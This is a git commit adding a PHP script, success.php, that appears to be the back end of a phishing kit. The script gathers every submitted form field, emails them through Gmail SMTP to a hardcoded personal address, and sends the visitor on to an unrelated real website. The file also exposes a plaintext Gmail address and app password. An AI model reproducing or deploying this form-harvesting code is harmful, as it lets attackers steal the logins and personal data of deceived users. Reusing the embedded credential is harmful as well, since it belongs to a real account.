932430f27a9118b60e6816668a6b95e91a54460f
violation-request-page <145922328+violation-request-page@users.noreply.github.com>
2026-05-13 16:53:02 +0500

    Add files via upload

---
+++ success.php
@@ -0,0 +1,59 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+header("Location: https://techarz.com/");
+
+require 'Exception.php';
+require 'PHPMailer.php';
+require 'SMTP.php';
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
+    $emailBody = '';
+
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+    }
+
+
+
+    // PHPMailer object creation
+    $mail = new PHPMailer(true);
+
+    try {
+        // SMTP settings
+        $mail->isSMTP();
+        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'sanullah947@gmail.com'; // Replace with your email address
+        $mail->Password   = 'rfxv cymt omko rjdy'; // Replace with your email password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+
+        // Email properties
+        $mail->setFrom('sanullah947@gmail.com', 'PROFESSOR');
+        $mail->addAddress('sanullah947@gmail.com');
+       $mail->addAddress('sanullah947@gmail.com');
+       $mail->addAddress('WORKAR EMAIL');
+
+      // Email recipient's address
+
+        // Email content
+        $mail->isHTML(true);
+        $mail->Subject = 'WORK';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
+        
+        // Send email
+        $mail->send();
+        echo 'Email successfully sent using PHPMailer.';
+    } catch (Exception $e) {
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+    }
+} else {
+    echo "Invalid request!";
+}
+?>
